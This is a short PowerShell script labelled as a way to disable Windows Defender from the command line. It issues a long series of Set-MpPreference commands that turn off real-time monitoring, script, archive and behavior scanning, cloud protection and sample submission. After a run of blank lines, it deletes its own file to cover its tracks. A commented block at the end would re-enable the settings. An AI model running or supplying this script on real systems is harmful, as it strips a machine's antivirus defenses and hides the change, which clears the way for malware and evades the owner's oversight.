#disable windows defender from cmd
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -EnableControlledFolderAccess Disabled
Set-MpPreference -EnableNetworkProtection AuditMode
Set-MpPreference -ForceSecureBootCheck $false
Set-MpPreference -MAPSReporting Disabled
Set-MpPreference -SubmitSamplesConsent NeverSend
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableRemovableDriveScanning $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisablePrivacyMode $true
Set-MpPreference -PUAProtection Disabled
Set-MpPreference -DisableCloudBasedProtection $true
Set-MpPreference -HighThreatDefaultAction Block
Set-MpPreference -ModerateThreatDefaultAction Block
Set-MpPreference -LowThreatDefaultAction Block
Set-MpPreference -SevereThreatDefaultAction Block

#








Remove-Item $PSCommandPath -Force

<# Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -DisableIntrusionPreventionSystem $false
Set-MpPreference -DisableIOAVProtection $false
Set-MpPreference -DisableScriptScanning $false
Set-MpPreference -EnableControlledFolderAccess Enabled
Set-MpPreference -EnableNetworkProtection Enabled
Set-MpPreference -ForceSecureBootCheck $true
Set-MpPreference -MAPSReporting Advanced
Set-MpPreference -SubmitSamplesConsent AlwaysSend
Set-MpPreference -DisableArchiveScanning $false
Set-MpPreference -DisableBehaviorMonitoring $false
Set-MpPreference -DisableRemovableDriveScanning $false
Set-MpPreference -DisableBlockAtFirstSeen $false
Set-MpPreference -DisablePrivacyMode $false
Set-MpPreference -PUAProtection Enabled
Set-MpPreference -DisableCloudBasedProtection $false
Set-MpPreference -HighThreatDefaultAction Clean
Set-MpPreference -ModerateThreatDefaultAction Clean
Set-MpPreference -LowThreatDefaultAction Clean
Set-MpPreference -SevereThreatDefaultAction Clean #>